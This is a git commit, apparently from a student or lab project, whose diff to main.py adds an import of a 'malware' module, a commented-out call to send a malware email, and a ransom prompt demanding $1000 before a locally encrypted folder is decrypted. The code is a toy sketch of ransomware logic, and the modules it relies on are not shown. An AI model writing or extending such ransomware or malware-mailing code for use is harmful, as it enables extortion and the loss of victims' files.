93ed137e885dbed2fd3bf75de1ce09709386eb1e
jiad-saegus <jiad.abdul@saegus.com>
2024-12-19 21:50:22 +0100

    Malware update

--- main.py
+++ main.py
@@ -1,9 +1,13 @@
 import aes
+import malware
 
 def main():
     folder = aes.read_folder("./dossier_confidentiel")
     aes.encrypt_folder(folder, aes.key)
-    aes.decrypt_folder(folder, aes.key)
+    # malware.send_malware_email()
+    pay = input("Pay me 1000$ to decrypt your files: y or n\n->  ")
+    if pay == "y":
+        aes.decrypt_folder(folder, aes.key)
     print("Hello, World!")
 
     
